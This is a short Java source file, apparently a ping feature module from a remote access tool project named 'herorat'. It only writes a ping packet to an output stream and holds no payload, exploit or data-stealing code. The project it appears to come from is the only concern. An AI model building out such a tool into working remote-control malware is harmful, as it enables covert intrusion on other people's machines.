package net.herorat.features.ping;

import java.io.DataOutputStream;

import net.herorat.network.Packet;
import net.herorat.network.Packet1Ping;


public class Ping
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p = new Packet1Ping(outputstream, new String[] { });
		p.write();
	}
}